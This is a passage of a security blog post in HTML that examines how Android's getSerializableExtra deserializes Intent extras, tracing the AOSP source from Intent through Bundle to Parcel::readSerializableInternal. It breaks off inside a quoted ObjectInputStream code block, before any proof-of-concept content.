@@ -1,0 +1,972 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Introduction Serialization and deserialization mechanisms are always risky operations from a security point of view. In most languages and frameworks, if an attacker is able to deserialize arbitrary input (or just corrupt it as we have demonstrated years ago with the Rusty Joomla RCE) the impact is usually the most critical: Remote Code Execution."><title>Android Deserialization Deep Dive</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://1day.dev//icon.png><link href=https://1day.dev/styles.7153093e4d1bbb584a28469cadfa3f88.min.css rel=stylesheet><link href=https://1day.dev/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://1day.dev/js/darkmode.e6934a61ff52b65bd16cdf94b370f112.min.js></script>
+<script src=https://1day.dev/js/util.9825137f5e7825e8553c68ce39ac9e44.min.js></script>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/copy-tex.min.js integrity=sha384-ww/583aHhxWkz5DEVn6OKtNiIaLi2iBRNZXfJRiY1Ai7tnJ9UXpEsyvOITVpTl4A crossorigin=anonymous></script>
+<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
+<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
+<script src=https://1day.dev/js/popover.53ad9a087e3feeaaa12b63bfd02d923b.min.js></script>
+<script src=https://1day.dev/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
+<script src=https://1day.dev/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
+<script src=https://1day.dev/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
+<script>const BASE_URL="https://1day.dev/",fetchData=Promise.all([fetch("https://1day.dev/indices/linkIndex.f95908f70ec33c60c8fcda9ef7621f27.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://1day.dev/indices/contentIndex.57c5230d6cf535a95b61121ae43692b3.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://1day.dev",!1,!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!1;drawGraph("https://1day.dev",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],macros:{'’':"'"},throwOnError:!1})}</script><script type=module>
+    import { attachSPARouting } from "https:\/\/1day.dev\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
+    attachSPARouting(init, render)
+  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-BZ6HJYMG3K"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-BZ6HJYMG3K",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
+<script defer src=https://1day.dev/js/full-text-search.24827f874defbbc6d529926cbfcfb493.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://1day.dev/>👾 @kiks</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
+<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>Android Deserialization Deep Dive</h1><p class=meta>Last updated
+Apr 14, 2025</p><ul class=tags><li><a href=https://1day.dev/tags/Android/>Android</a></li><li><a href=https://1day.dev/tags/Reverse-Engineering/>Reverse engineering</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#introduction>Introduction</a></li><li><a href=#getserializableextra-introduction><code>getSerializableExtra</code> introduction</a></li><li><a href=#getserializableextra-internal-code-overview><code>getSerializableExtra</code> internal code overview</a><ol><li><a href=#first-steps>First steps</a></li><li><a href=#parcelreadserializableinternal><code>Parcel::readSerializableInternal</code></a></li><li><a href=#objectinputstream><code>ObjectInputStream</code></a></li></ol></li><li><a href=#deserialization-summary>Deserialization Summary</a></li><li><a href=#all-you-need-is-a-good-gadget-right>All you need is a good gadget, right?</a><ol><li><a href=#application-specific-gadgets>Application specific gadgets</a></li><li><a href=#internal-deserialization-process>Internal deserialization process</a></li><li><a href=#transient-and-not-serializable-classes>Transient and not Serializable classes</a></li></ol></li><li><a href=#proof-of-concept>Proof-Of-Concept</a><ol><li><a href=#scenario>Scenario</a></li><li><a href=#exploitation>Exploitation</a></li></ol></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#references>References</a></li></ol></nav></details></aside><a href=#introduction><h2 id=introduction><span class=hanchor arialabel=Anchor># </span>Introduction</h2></a><p>Serialization and deserialization mechanisms are always risky operations from a security point of view. In most languages and frameworks, if an attacker is able to deserialize arbitrary input (or just corrupt it as we have demonstrated years ago with the Rusty Joomla RCE) the impact is usually the most critical: Remote Code Execution. Without re-explaining the wheel, since there are already multiple good resources online that explains the basic concepts of insecure deserialization issues, we would like to put our attention into an interesting android API and class: <code>getSerializableExtra</code> and <code>Serializable</code>.</p><a href=#getserializableextra-introduction><h2 id=getserializableextra-introduction><span class=hanchor arialabel=Anchor># </span><code>getSerializableExtra</code> introduction</h2></a><p>The
+<a href=https://developer.android.com/reference/android/content/Intent#getSerializableExtra%28java.lang.String%29 rel=noopener><code>getSerializableExtra</code></a> API, from the
+<a href=https://developer.android.com/reference/android/content/Intent#getSerializableExtra%28java.lang.String,-java.lang.Class%3CT%3E%29 rel=noopener><code>Intent</code></a> class, permits to retrieve a
+<a href=https://developer.android.com/reference/java/io/Serializable rel=noopener><code>Serializable</code></a> object through an extra parameter of a receiving Intent and, if the component is exported and enabled, it can represents an interesting attack surface from an attacker point of view. The <code>getSerializableExtra(String name)</code> has been deprecated in Android API level 33 (Android 13) in favor of the type safer <code>getSerializableExtra(String name, Class&lt;T> clazz)</code>. The
+<a href=https://developer.android.com/reference/java/io/Serializable rel=noopener><code>Serializable</code></a> class documentation, that enables object deserialization, contains the following bold text:</p><blockquote><p><strong>Warning: Deserialization of untrusted data is inherently dangerous and should be avoided. Untrusted data should be carefully validated.</strong></p></blockquote><p>Since we already know the generic risks of deserializing an arbitrary input object, the objective of this deep dive is to understand the real consequences of calling <code>getSerializableExtra</code> on arbitrary input with and without the type safer parameter.</p><a href=#getserializableextra-internal-code-overview><h2 id=getserializableextra-internal-code-overview><span class=hanchor arialabel=Anchor># </span><code>getSerializableExtra</code> internal code overview</h2></a><a href=#first-steps><h3 id=first-steps><span class=hanchor arialabel=Anchor># </span>First steps</h3></a><p>What&rsquo;s better than actually begin by reading the source code of the API in our interest? We think nothing, so this is the summary of the <code>getSerializableExtra</code> flow using AOSP on Android 15: <code>Intent::getSerializableExtra</code> => <code>Bundle::getSerializable</code> => <code>BaseBundle::getSerializable</code> => <code>BaseBundle::getValue</code> => <code>..</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// Intent::getSerializableExtra
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>public</span> <span class=nd>@Nullable</span> <span class=n>Serializable</span> <span class=nf>getSerializableExtra</span><span class=o>(</span><span class=n>String</span> <span class=n>name</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>mExtras</span> <span class=o>==</span> <span class=kc>null</span> <span class=o>?</span> <span class=kc>null</span> <span class=o>:</span> <span class=n>mExtras</span><span class=o>.</span><span class=na>getSerializable</span><span class=o>(</span><span class=n>name</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// Bundle::getSerializable
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>public</span> <span class=n>Serializable</span> <span class=nf>getSerializable</span><span class=o>(</span><span class=nd>@Nullable</span> <span class=n>String</span> <span class=n>key</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kd>super</span><span class=o>.</span><span class=na>getSerializable</span><span class=o>(</span><span class=n>key</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// BaseBundle::getSerializable
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>Serializable</span> <span class=nf>getSerializable</span><span class=o>(</span><span class=nd>@Nullable</span> <span class=n>String</span> <span class=n>key</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>unparcel</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>Object</span> <span class=n>o</span> <span class=o>=</span> <span class=n>getValue</span><span class=o>(</span><span class=n>key</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>o</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>null</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>(</span><span class=n>Serializable</span><span class=o>)</span> <span class=n>o</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>ClassCastException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>typeWarning</span><span class=o>(</span><span class=n>key</span><span class=o>,</span> <span class=n>o</span><span class=o>,</span> <span class=s>&#34;Serializable&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>null</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// BaseBundle::getValue
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>final</span> <span class=n>Object</span> <span class=nf>getValue</span><span class=o>(</span><span class=n>String</span> <span class=n>key</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>getValue</span><span class=o>(</span><span class=n>key</span><span class=o>,</span> <span class=cm>/* clazz */</span> <span class=kc>null</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// BaseBundle::getValue
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>final</span> <span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span> <span class=n>T</span> <span class=nf>getValue</span><span class=o>(</span><span class=n>String</span> <span class=n>key</span><span class=o>,</span> <span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span> <span class=n>clazz</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=c1>// Avoids allocating Class[0] array
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>return</span> <span class=n>getValue</span><span class=o>(</span><span class=n>key</span><span class=o>,</span> <span class=n>clazz</span><span class=o>,</span> <span class=o>(</span><span class=n>Class</span><span class=o>&lt;?&gt;[])</span> <span class=kc>null</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=c1>// BaseBundle::getValue
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>final</span> <span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span> <span class=n>T</span> <span class=nf>getValue</span><span class=o>(</span><span class=n>String</span> <span class=n>key</span><span class=o>,</span> <span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span> <span class=n>clazz</span><span class=o>,</span> <span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;?&gt;...</span> <span class=n>itemTypes</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>mMap</span><span class=o>.</span><span class=na>indexOfKey</span><span class=o>(</span><span class=n>key</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=o>(</span><span class=n>i</span> <span class=o>&gt;=</span> <span class=n>0</span><span class=o>)</span> <span class=o>?</span> <span class=n>getValueAt</span><span class=o>(</span><span class=n>i</span><span class=o>,</span> <span class=n>clazz</span><span class=o>,</span> <span class=n>itemTypes</span><span class=o>)</span> <span class=o>:</span> <span class=kc>null</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// BaseBundle::getValueAt
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>final</span> <span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span> <span class=n>T</span> <span class=nf>getValueAt</span><span class=o>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>,</span> <span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span> <span class=n>clazz</span><span class=o>,</span> <span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;?&gt;...</span> <span class=n>itemTypes</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>Object</span> <span class=n>object</span> <span class=o>=</span> <span class=n>mMap</span><span class=o>.</span><span class=na>valueAt</span><span class=o>(</span><span class=n>i</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=o>(</span><span class=n>object</span> <span class=k>instanceof</span> <span class=n>BiFunction</span><span class=o>&lt;?,</span> <span class=o>?,</span> <span class=o>?&gt;)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>		<span class=kd>synchronized</span> <span class=o>(</span><span class=k>this</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>object</span> <span class=o>=</span> <span class=n>unwrapLazyValueFromMapLocked</span><span class=o>(</span><span class=n>i</span><span class=o>,</span> <span class=n>clazz</span><span class=o>,</span> <span class=n>itemTypes</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>		<span class=o>}</span>
+</span></span><span class=line><span class=cl>	<span class=o>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>?</span> <span class=n>clazz</span><span class=o>.</span><span class=na>cast</span><span class=o>(</span><span class=n>object</span><span class=o>)</span> <span class=o>:</span> <span class=o>(</span><span class=n>T</span><span class=o>)</span> <span class=n>object</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>BaseBundle::getSerializable</code> is the one responsible to retrieve the value from the received Intent (or at this level is better to define it as a
+<a href=https://developer.android.com/reference/android/os/Parcel rel=noopener><code>Parcel</code></a> object) and it returns the object casted to <code>Serializable</code>. This flow is really similar to the retrieval of other parameter types. If you see the <code>getString</code>, <code>getCharSequence</code> or <code>getDobule</code> methods they act in a similar way: they retrieve a generic <code>Object</code> from <code>mMap.getKey()</code> and then return its type through casting (e.g. <code>return (String) o)</code>).</p><p>In this case things are a little bit differents: <code>getValue</code> specifies the <code>null</code> class and, after some calls, <code>getValueAt</code> is called to retrieve the serialized object. <code>mMap.valueAt</code> returns the generic <code>Object</code> that is then returned with a generic <code>T</code> cast (if no class is specified) to the caller. In the middle of this there is a really weird if condition that checks if the retrieved <code>object</code> is an instance of <code>BiFunction&lt;?, ?, ?></code>. Honestly, I was not able to determine this condition manually with code review, so I tried it at runtime and is actually triggering the true path when <code>getSerializable</code> is called. The <code>unwrapLazyValueFromMapLocked</code> stack trace is really interesting: <code>android.os.BaseBundle.unwrapLazyValueFromMapLocked</code> => <code>android.os.Parcel$LazyValue.apply</code> => <code>android.os.Parcel.readValue</code> => <code>android.os.Parcel.readSerializableInternal</code></p><a href=#parcelreadserializableinternal><h3 id=parcelreadserializableinternal><span class=hanchor arialabel=Anchor># </span><code>Parcel::readSerializableInternal</code></h3></a><p>Since our main interest is on how input objects are handled and deserialized, we can directly focus on the latest method that seems to align with our objective:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>private</span> <span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span> <span class=n>T</span> <span class=nf>readSerializableInternal</span><span class=o>(</span><span class=nd>@Nullable</span> <span class=kd>final</span> <span class=n>ClassLoader</span> <span class=n>loader</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>		<span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span> <span class=n>clazz</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>String</span> <span class=n>name</span> <span class=o>=</span> <span class=n>readString</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=o>(</span><span class=n>name</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>		<span class=c1>// For some reason we were unable to read the name of the Serializable (either there
+</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=c1>// is nothing left in the Parcel to read, or the next value wasn&#39;t a String), so
+</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=c1>// return null, which indicates that the name wasn&#39;t found in the parcel.
+</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=k>return</span> <span class=kc>null</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>	<span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>try</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=n>loader</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>			<span class=c1>// If custom classloader is provided, resolve the type of serializable using the
+</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=c1>// name, then check the type before deserialization. As in this case we can resolve
+</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=c1>// the class the same way as ObjectInputStream, using the provided classloader.
+</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>cl</span> <span class=o>=</span> <span class=n>Class</span><span class=o>.</span><span class=na>forName</span><span class=o>(</span><span class=n>name</span><span class=o>,</span> <span class=kc>false</span><span class=o>,</span> <span class=n>loader</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=o>(!</span><span class=n>clazz</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>cl</span><span class=o>))</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>				<span class=k>throw</span> <span class=k>new</span> <span class=n>BadTypeParcelableException</span><span class=o>(</span><span class=s>&#34;Serializable object &#34;</span>
+</span></span><span class=line><span class=cl>						<span class=o>+</span> <span class=n>cl</span><span class=o>.</span><span class=na>getName</span><span class=o>()</span> <span class=o>+</span> <span class=s>&#34; is not a subclass of required class &#34;</span>
+</span></span><span class=line><span class=cl>						<span class=o>+</span> <span class=n>clazz</span><span class=o>.</span><span class=na>getName</span><span class=o>()</span> <span class=o>+</span> <span class=s>&#34; provided in the parameter&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>			<span class=o>}</span>
+</span></span><span class=line><span class=cl>		<span class=o>}</span>
+</span></span><span class=line><span class=cl>		<span class=kt>byte</span><span class=o>[]</span> <span class=n>serializedData</span> <span class=o>=</span> <span class=n>createByteArray</span><span class=o>();</span> <span class=c1>//1
+</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=n>ByteArrayInputStream</span> <span class=n>bais</span> <span class=o>=</span> <span class=k>new</span> <span class=n>ByteArrayInputStream</span><span class=o>(</span><span class=n>serializedData</span><span class=o>);</span> <span class=c1>//2
+</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=n>ObjectInputStream</span> <span class=n>ois</span> <span class=o>=</span> <span class=k>new</span> <span class=n>ObjectInputStream</span><span class=o>(</span><span class=n>bais</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>			<span class=nd>@Override</span>
+</span></span><span class=line><span class=cl>			<span class=kd>protected</span> <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>resolveClass</span><span class=o>(</span><span class=n>ObjectStreamClass</span> <span class=n>osClass</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>					<span class=kd>throws</span> <span class=n>IOException</span><span class=o>,</span> <span class=n>ClassNotFoundException</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>				<span class=c1>// try the custom classloader if provided
+</span></span></span><span class=line><span class=cl><span class=c1></span>				<span class=k>if</span> <span class=o>(</span><span class=n>loader</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
